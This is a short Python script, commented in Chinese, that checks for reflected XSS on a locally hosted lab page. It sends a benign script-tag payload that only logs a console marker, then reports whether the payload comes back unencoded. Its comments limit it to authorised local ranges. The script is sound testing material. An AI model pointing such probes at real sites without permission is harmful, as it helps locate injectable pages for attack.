# 仅用于授权本机靶场的反射型 XSS 复核草案：未运行，需人工适配 BASE_URL
import requests

BASE_URL = "http://127.0.0.1:8080/xss/reflected.php"  # 占位路径，按靶场实际地址替换
MARKER = "LLM_LAB_XSS"


def build_payload():
    # 无害标记：仅在浏览器控制台输出，不读取 Cookie、不外传数据、不植入持久控制
    return "<script>console.log('%s')</script>" % MARKER


def main():
    payload = build_payload()
    resp = requests.get(BASE_URL, params={"name": payload}, timeout=5)
    print("status:", resp.status_code)
    print("request_url:", resp.url)
    print("raw_payload_in_body:", payload in resp.text)
    print("请在浏览器打开 request_url，在开发者工具 Console 观察是否输出", MARKER)
    if payload not in resp.text:
        print("响应中未见原样 payload，可能已被编码，需人工确认实际上下文")


if __name__ == "__main__":
    main()
